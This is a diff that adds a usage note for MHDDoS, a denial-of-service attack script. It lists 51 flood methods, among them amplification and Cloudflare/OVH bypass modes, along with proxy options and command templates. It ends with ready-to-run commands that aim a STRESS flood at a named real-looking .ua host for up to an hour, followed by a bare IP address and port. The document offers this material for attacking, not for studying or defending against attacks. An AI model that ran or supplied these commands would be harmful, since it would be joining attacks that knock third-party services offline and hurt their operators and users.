@@ -1,0 +1,35 @@
+* MHDDoS - DDoS Attack Script With 51 Methods
+Note: If the Proxy list is empty, the attack will run without proxies
+      If the Proxy file doesn't exist, the script will download proxies and check them.
+      Proxy Type 0 = All in config.json
+      SocksTypes:
+         - 6 = RANDOM
+         - 5 = SOCKS5
+         - 4 = SOCKS4
+         - 1 = HTTP
+         - 0 = ALL
+ > Methods:
+ - Layer4
+ | UDP, MINECRAFT, ARD, CPS, TS3, FIVEM, CLDAP, MEM, DNS, MCBOT, TCP, SYN, CONNECTION, RDP, NTP, CHAR, VSE, MCPE | 18 Methods
+ - Layer7
+ | XMLRPC, APACHE, STRESS, DGB, DYN, GET, KILLER, BYPASS, POST, NULL, BOT, GSB, AVB, COOKIE, PPS, CFBUAM, OVH, CFB, DOWNLOADER, BOMB, EVEN, SLOW, HEAD | 23 Methods
+ - Tools
+ | CFIP, CHECK, INFO, DNS, PING, TSSRV, DSTAT | 7 Methods
+ - Others
+ | TOOLS, HELP, STOP | 3 Methods
+ - All 51 Methods
+
+Example:
+   L7: python3 /home/dyman/Projects/war_zone/battleship_cannon_shot/MHDDoS/start.py <method> <url> <socks_type> <threads> <proxylist> <rpc> <duration> <debug=optional>
+   L4: python3 /home/dyman/Projects/war_zone/battleship_cannon_shot/MHDDoS/start.py <method> <ip:port> <threads> <duration>
+   L4 Proxied: python3 /home/dyman/Projects/war_zone/battleship_cannon_shot/MHDDoS/start.py <method> <ip:port> <threads> <duration> <socks_type> <proxylist>
+   L4 Amplification: python3 /home/dyman/Projects/war_zone/battleship_cannon_shot/MHDDoS/start.py <method> <ip:port> <threads> <duration> <reflector file (only use with Amplification)>
+   
+   
+   
+   
+python3 start.py STRESS http://test2.lug.in.ua 0 2 100 3600
+python3 start.py STRESS http://test2.lug.in.ua 0 2 0 10 600 true
+
+
+http://77.236.238.69:1256
